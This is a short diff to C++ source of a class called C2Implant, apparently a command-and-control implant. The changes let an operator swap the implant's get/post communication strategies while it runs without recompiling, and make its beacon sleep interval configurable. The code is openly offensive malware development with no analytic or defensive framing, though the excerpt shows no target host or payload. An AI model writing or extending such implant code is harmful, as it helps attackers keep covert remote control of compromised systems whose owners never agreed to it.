@@ -58,6 +58,9 @@ void C2Implant::init() {
     //set default options
     SettingsManager::instance().set("comms_get_function", "[[ init_get_function ]]");
     SettingsManager::instance().set("comms_post_function", "[[ init_post_function ]]");
+    SettingsManager::instance().set("comms_get_strat_map", s_ingress_map);
+    SettingsManager::instance().set("comms_post_strat_map", s_egress_map);
+
 }
 
 int C2Implant::register_implant() {
@@ -96,10 +99,11 @@ void C2Implant::cycle() {
     std::cout << "[*] Using Hardcoded get Strategy" << std::endl;
     std::cout << "[*] Using Hardcoded post Strategy" << std::endl;
 
-    std::string get = SettingsManager::instance().get<std::string>("comms_get_function", "");
-    std::string post = SettingsManager::instance().get<std::string>("comms_post_function", "");
-
     while (true) {
+        //get these variables each loop, so that if the operator changes them on the fly, the implant will pick up those changes without needing to be recompiled.
+        std::string get = SettingsManager::instance().get<std::string>("comms_get_function", "");
+        std::string post = SettingsManager::instance().get<std::string>("comms_post_function", "");
+
         // 1. Check for Strategy Existence
         if (s_ingress_map.find(get) == s_ingress_map.end() || s_egress_map.find(post) == s_egress_map.end()) {
             std::cerr << "[-] Invalid strategies selected.\n";
@@ -139,6 +143,7 @@ void C2Implant::cycle() {
 
 void C2Implant::sleep_implant() {
     // Using standard cross-platform sleep for safety.
-    // Replace with Sleep(5000) if you specifically need the WinAPI hook.
-    std::this_thread::sleep_for(std::chrono::milliseconds(5000));
+    //could use winapi as well. 
+    int sleep_time = SettingsManager::instance().get<int>("sleep_time", 5); //CHANGEME
+    std::this_thread::sleep_for(std::chrono::milliseconds(sleep_time * 1000));
 }
